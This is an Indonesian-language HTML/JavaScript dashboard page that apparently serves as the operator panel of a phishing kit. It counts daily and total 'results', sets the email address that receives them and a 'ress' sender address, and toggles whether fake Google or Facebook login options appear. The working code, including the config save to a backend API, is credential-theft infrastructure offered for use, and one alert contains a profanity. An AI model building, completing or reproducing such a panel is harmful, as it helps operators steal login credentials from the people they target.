<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Dashboard</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link href="https://fonts.googleapis.com/css2?family=Outfit:wght@500;600;700&family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
<style>
  :root{
    --bg-1:#c4d4e6;
    --bg-2:#9fb4cf;
    --ink:#1d2b3a;
    --muted:#5f7084;
    --blue:#3f6fb0;
  }
  *{box-sizing:border-box;margin:0;padding:0}

  body{
    font-family:'Inter',sans-serif;
    min-height:100vh;
    color:var(--ink);
    background:linear-gradient(165deg,var(--bg-1),var(--bg-2) 80%);
    overflow-x:hidden;
    padding-bottom:40px;
  }

  .blob{position:fixed;border-radius:50%;filter:blur(60px);z-index:0;pointer-events:none;}
  .b1{width:300px;height:300px;top:-90px;left:-70px;background:#eaf2fb;opacity:.55}
  .b2{width:320px;height:320px;top:120px;right:-110px;background:#b7cbe4;opacity:.5}
  .b3{width:260px;height:260px;bottom:0;left:-40px;background:#dfe9f6;opacity:.45}

  header,main{position:relative;z-index:1}

  header{height:64px;padding:0 16px;display:flex;align-items:center;justify-content:space-between;gap:11px;}
  .header-left{display:flex;align-items:center;gap:11px}
  .mark{width:36px;height:36px;border-radius:12px;display:flex;align-items:center;justify-content:center;color:var(--ink);font-size:15px;}
  header h1{font-family:'Outfit',sans-serif;font-size:20px;font-weight:600;color:var(--ink);}

  .btn-logout{width:40px;height:40px;border-radius:13px;display:flex;align-items:center;justify-content:center;font-size:15px;color:#c23b3b;cursor:pointer;}

  main{padding:0 16px}

  .glass{position:relative;border-radius:26px;background:rgba(255,255,255,.05);backdrop-filter:blur(10px) saturate(160%);-webkit-backdrop-filter:blur(10px) saturate(160%);border:1px solid rgba(255,255,255,.28);overflow:hidden;box-shadow:0 1px 0 rgba(255,255,255,.55) inset, 0 -14px 20px rgba(20,35,55,.07) inset, 0 24px 40px rgba(20,35,55,.22), 0 6px 10px rgba(20,35,55,.12);}
  .glass::before{content:"";position:absolute;top:-40%;left:-20%;width:85%;height:70%;background:linear-gradient(135deg,rgba(255,255,255,.4),rgba(255,255,255,.05) 55%,transparent 70%);transform:rotate(-8deg);pointer-events:none;}
  .glass::after{content:"";position:absolute;top:0;left:8%;right:8%;height:1px;background:linear-gradient(90deg,transparent,rgba(255,255,255,.85),transparent);}
  .glass > *{position:relative;z-index:1}

  .mark, .btn-logout, .icon-box, .btn-refresh{background:rgba(255,255,255,.06);backdrop-filter:blur(8px) saturate(160%);-webkit-backdrop-filter:blur(8px) saturate(160%);border:1px solid rgba(255,255,255,.32);box-shadow:0 1px 0 rgba(255,255,255,.55) inset, 0 8px 16px rgba(20,35,55,.18);}

  .stats{margin-top:24px;display:flex;align-items:center;padding:20px 6px 18px;}
  .stat{flex:1;text-align:center;position:relative}
  .stat + .stat::before{content:"";position:absolute;left:0;top:50%;transform:translateY(-50%);width:1px;height:40px;background:rgba(29,43,58,.1);}
  .icon-box{width:38px;height:38px;margin:0 auto 8px;border-radius:12px;display:flex;align-items:center;justify-content:center;font-size:15px;color:var(--ink);}
  .num{font-family:'Outfit',sans-serif;font-size:25px;font-weight:600;line-height:1.1;color:var(--ink)}
  .stat-label{font-size:11.5px;color:var(--muted);margin-top:4px}

  .card{margin-top:20px;padding:28px 18px 22px;}
  .card h2{font-family:'Outfit',sans-serif;font-size:20px;font-weight:600;display:flex;align-items:center;gap:10px;margin-bottom:22px;color:var(--ink);}
  .card h2 i{color:var(--blue);font-size:17px}

  .field-label{display:block;font-size:12.5px;color:var(--muted);margin-bottom:8px;}
  .input{width:100%;height:44px;border-radius:14px;border:1px solid rgba(255,255,255,.3);background:rgba(255,255,255,.06);backdrop-filter:blur(8px);box-shadow:0 1px 0 rgba(255,255,255,.45) inset, 0 4px 10px rgba(20,35,55,.1);padding:0 13px;font-family:inherit;font-size:15px;font-weight:500;color:var(--ink);outline:none;transition:box-shadow .2s, border-color .2s;}
  .input::placeholder{color:#7f8fa2}
  .input:focus{border-color:rgba(63,111,176,.55);box-shadow:0 0 0 4px rgba(63,111,176,.15), 0 1px 0 rgba(255,255,255,.45) inset;}
  .input[readonly]{color:var(--blue);cursor:default}
  .input[readonly]:focus{border-color:rgba(255,255,255,.3);box-shadow:0 1px 0 rgba(255,255,255,.45) inset, 0 4px 10px rgba(20,35,55,.1);}
  .group{margin-bottom:18px}
  .row{display:flex;gap:11px}
  .row > *{flex:1;min-width:0}
  .with-btn{position:relative}
  .with-btn .input{padding-right:48px}
  .btn-refresh{position:absolute;right:5px;top:5px;width:32px;height:32px;border-radius:10px;color:var(--ink);display:flex;align-items:center;justify-content:center;cursor:pointer;font-size:13px;}

  .btn-save{margin-top:24px;border:1px solid rgba(255,255,255,.4);border-radius:999px;background:rgba(63,111,176,.3);backdrop-filter:blur(10px);color:#fff;font-family:'Outfit',sans-serif;font-weight:600;font-size:15px;padding:0 26px;height:46px;display:inline-flex;align-items:center;gap:9px;cursor:pointer;box-shadow:0 1px 0 rgba(255,255,255,.45) inset, 0 14px 28px rgba(30,50,75,.3);}
  .btn-save:active{transform:scale(.97)}

  /* CSS BUAT SWITCH TOGGLE */
  .switch { position: relative; display: inline-block; width: 46px; height: 24px; }
  .switch input { opacity: 0; width: 0; height: 0; }
  .slider { position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0; background-color: #ccc; -webkit-transition: .4s; transition: .4s; border-radius: 34px; }
  .slider:before { position: absolute; content: ""; height: 18px; width: 18px; left: 3px; bottom: 3px; background-color: white; -webkit-transition: .4s; transition: .4s; border-radius: 50%; }
  input:checked + .slider { background-color: #3f6fb0; }
  input:checked + .slider:before { -webkit-transform: translateX(22px); -ms-transform: translateX(22px); transform: translateX(22px); }
</style>
</head>
<body>

<div class="blob b1"></div>
<div class="blob b2"></div>
<div class="blob b3"></div>

<header>
  <div class="header-left">
    <div class="mark glass"><i class="fa-solid fa-paper-plane"></i></div>
    <h1>Dashboard</h1>
  </div>
  <button type="button" class="btn-logout glass" onclick="logout()"><i class="fa-solid fa-right-from-bracket"></i></button>
</header>

<main>
  <section class="glass stats">
    <div class="stat">
      <div class="icon-box"><i class="fa-solid fa-paper-plane"></i></div>
      <div class="num" id="statHariIni">0</div>
      <div class="stat-label">Result hari ini</div>
    </div>
    <div class="stat">
      <div class="icon-box"><i class="fa-solid fa-clock-rotate-left"></i></div>
      <div class="num" id="statKemarin">0</div>
      <div class="stat-label">Kemarin</div>
    </div>
    <div class="stat">
      <div class="icon-box"><i class="fa-solid fa-layer-group"></i></div>
      <div class="num" id="statTotal">0</div>
      <div class="stat-label">Total result</div>
    </div>
  </section>

  <section class="glass card">
    <h2><i class="fa-solid fa-envelope"></i> Setting email</h2>

    <div class="group">
      <label class="field-label">Email tujuan</label>
      <input type="text" class="input" id="emailTujuan" placeholder="nama@email.com">
    </div>

    <div class="group">
      <label class="field-label">Nama ress</label>
      <div class="row">
        <input type="text" class="input" id="namaRess1">
        <div class="with-btn">
          <input type="text" class="input" id="namaRess2">
          <button type="button" class="btn-refresh glass" onclick="randomEmail()"><i class="fa-solid fa-rotate"></i></button>
        </div>
      </div>
    </div>

    <div class="group">
      <label class="field-label">Banner URL &amp; footer text</label>
      <div class="row">
        <input type="text" class="input" id="bannerUrl" placeholder="https://...">
        <input type="text" class="input" id="footerText" value="Web Kenz" readonly>
      </div>
    </div>

    <!-- FITUR TOGGLE LOGIN -->
    <div class="group" style="border-top: 1px solid rgba(255,255,255,.2); padding-top: 18px; margin-top: 18px;">
      <label class="field-label" style="font-size: 14px; font-weight: 600; color: var(--ink); margin-bottom: 12px;">Pilihan Login (Pilih Minimal 1)</label>
      
      <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px;">
        <span style="font-size: 14px; font-weight: 500;">Google</span>
        <label class="switch">
          <input type="checkbox" id="toggleGoogle" onchange="checkToggle('google')">
          <span class="slider"></span>
        </label>
      </div>

      <div style="display: flex; justify-content: space-between; align-items: center;">
        <span style="font-size: 14px; font-weight: 500;">Facebook</span>
        <label class="switch">
          <input type="checkbox" id="toggleFacebook" onchange="checkToggle('facebook')">
          <span class="slider"></span>
        </label>
      </div>
    </div>

    <button type="button" class="btn-save" id="btnSimpan"><i class="fa-solid fa-floppy-disk"></i> Simpan</button>
  </section>
</main>

<script>
  const web_id = localStorage.getItem('web_session');
  if(!web_id) window.location.href = '/index.html';

  function logout() {
      localStorage.removeItem('web_session');
      window.location.href = '/index.html';
  }

  function randomEmail() {
      const randomStr = Math.random().toString(36).substring(2, 9);
      document.getElementById('namaRess2').value = `app_${randomStr}@4vt6.me`;
  }

  // Validasi UI: Ga boleh dua-duanya mati
  function checkToggle(changed) {
      const ggl = document.getElementById('toggleGoogle');
      const fb = document.getElementById('toggleFacebook');

      if (!ggl.checked && !fb.checked) {
          if (changed === 'google') fb.checked = true; // Kalo matiin ggl, paksa fb nyala
          else ggl.checked = true; // Kalo matiin fb, paksa ggl nyala
          alert("Minimal satu pilihan login harus aktif, BANGSAT!");
      }
  }

  async function loadData() {
      try {
          const res = await fetch(`/api/config?web_id=${web_id}`);
          const data = await res.json();
          
          if(data.email_tujuan) document.getElementById('emailTujuan').value = data.email_tujuan;
          if(data.footer_text) document.getElementById('footerText').value = data.footer_text;
          if(data.banner_url) document.getElementById('bannerUrl').value = data.banner_url;
          
          if(data.nama_ress) {
              let parts = data.nama_ress.split(' <');
              document.getElementById('namaRess1').value = parts[0] || '';
              if(parts[1]) {
                  document.getElementById('namaRess2').value = parts[1].replace('>', '') || '';
              }
          }
          
          if(data.stat_hari_ini !== undefined) document.getElementById('statHariIni').innerText = data.stat_hari_ini;
          if(data.stat_kemarin !== undefined) document.getElementById('statKemarin').innerText = data.stat_kemarin;
          if(data.stat_total !== undefined) document.getElementById('statTotal').innerText = data.stat_total;

          // Load Toggle Status
          document.getElementById('toggleGoogle').checked = data.show_google !== false;
          document.getElementById('toggleFacebook').checked = data.show_facebook !== false;

      } catch(e) {
          console.error("Gagal load config:", e);
      }
  }

  document.getElementById('btnSimpan').addEventListener('click', async function() {
      this.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Menyimpan...';
      this.disabled = true;

      let bannerVal = document.getElementById('bannerUrl').value.trim();
      if(!bannerVal) bannerVal = "atas.jpg";

      const payload = {
          web_id: web_id,
          email_tujuan: document.getElementById('emailTujuan').value,
          banner_url: bannerVal, 
          footer_text: document.getElementById('footerText').value,
          nama_ress: document.getElementById('namaRess1').value + ' <' + document.getElementById('namaRess2').value + '>',
          show_google: document.getElementById('toggleGoogle').checked,
          show_facebook: document.getElementById('toggleFacebook').checked
      };

      try {
          const res = await fetch('/api/config', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify(payload)
          });
          
          const result = await res.json();
          
          if(res.ok) {
              alert("SETTING BERHASIL DISIMPAN!");
          } else {
              alert("Gagal dari Server: " + (result.error || "Terjadi kesalahan sistem"));
          }
      } catch(e) {
          alert("Error Koneksi: " + e.message); 
      } finally {
          this.innerHTML = '<i class="fa-solid fa-floppy-disk"></i> Simpan';
          this.disabled = false;
      }
  });

  loadData();
</script>

</body>
</html>
